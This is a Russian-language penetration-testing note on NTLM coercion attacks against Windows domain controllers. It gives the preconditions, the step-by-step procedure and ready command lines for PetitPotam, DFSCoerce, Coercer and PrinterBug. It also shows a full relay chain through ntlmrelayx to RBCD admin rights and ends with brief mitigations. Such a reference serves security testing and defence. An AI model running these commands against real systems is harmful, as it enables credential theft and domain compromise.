#AD #windows #attacks #ntlm

> Это класс атак **принудительной аутентификации**, позволяющий заставить Windows-систему (часто контроллер домена) аутентифицироваться на сервере атакующего через уязвимые RPC-протоколы, что приводит к утечке NTLM-хэшей

### **Условия, необходимые для проведения Coerce-атаки:**

1. **Сетевая доступность** уязвимых портов (135/TCP, 445/TCP) между атакующим и целью
2. **Включенные соответствующие службы** на целевой системе (EFS, DFS, Spooler и т.д.)
3. **NTLM аутентификация** не отключена полностью в домене
4. **Отсутствие SMB Signing** на целевых системах (для Relay части)
5. **Уязвимая версия ОС** без соответствующих патчей

### Проведение атаки Coerce**

1. **Разведка:** Обнаружение контроллеров домена или Windows-серверов в сети
2. **Выбор протокола:** Определение, какие уязвимые протоколы доступны (EFSRPC, DFSNM и т.д.)
3. **Инициация Coerce:** Отправка специального RPC-запроса, указывающего аутентифицироваться на сервер атакующего:
4. **Перехват хэшей:** Атакующий получает NTLM-хэши (или Kerberos-билеты)
5. **Relay или Crack:**
    - **NTLM Relay:** Пересылка хэшей на другую службу (LDAP, SMB, HTTP)
    - **Офлайн взлом:** Попытка взлома хэшей
6. **Эскалация привилегий:** Использование полученных учетных данных для повышения прав


### **Инструменты для Coerce-атак:**

#### **1. PetitPotam** (EFSRPC)

```bash
# Базовое использование
python3 petitpotam.py <attacker_ip> <target_ip>

# С учетными данными
python3 petitpotam.py -d domain.local -u user -p password <attacker_ip> <target_ip>

# Слушать хэши
impacket-ntlmrelayx -t ldap://dc.domain.local --no-smb-server
```
#### **2. DFSCoerce** (DFSNM)

```bash
python3 dfscoerce.py -d domain -u user -p pass <attacker_ip> <target_ip>
```
#### **3. Coercer** (универсальный)

```bash
# Сканирование всех методов
coercer scan -u user -p password -d domain.local -t dc01.domain.local

# Принудительная аутентификация
coercer coerce -u user -p password -d domain.local \
  -t dc01.domain.local -l 192.168.1.100

# Аудит
coercer audit -d domain.local -u auditor -p "P@ssw0rd" --output report.html
```
#### **4. PrinterBug** (MS-RPRN)

```bash
SpoolSample.exe <target> <attacker_ip>
# или
python3 printerbug.py domain/user:password@target <attacker_ip>
```

## Проведение атаки

```bash
# 1. Запуск перехватчика
impacket-ntlmrelayx -t ldaps://dc.domain.local --add-computer --delegate-access

# 2. Запуск Coerce
python3 petitpotam.py 192.168.1.100 192.168.1.10

# 3. DC аутентифицируется на 192.168.1.100
# 4. ntlmrelayx получает хэши и создает компьютерную учетку
# 5. Получаем права администратора через RBCD
```

## Митигации

1) Отключение уязвимых служб Spooler, EFS, DFS
2) SMB-Signing
3) Отключение NTLM
4) Мониторинг событий 
- **Event ID 4624** (Type 3 аутентификация) с необычными исходящими подключениями
- **Event ID 4648** (явные учетные данные) с аутентификацией NTLM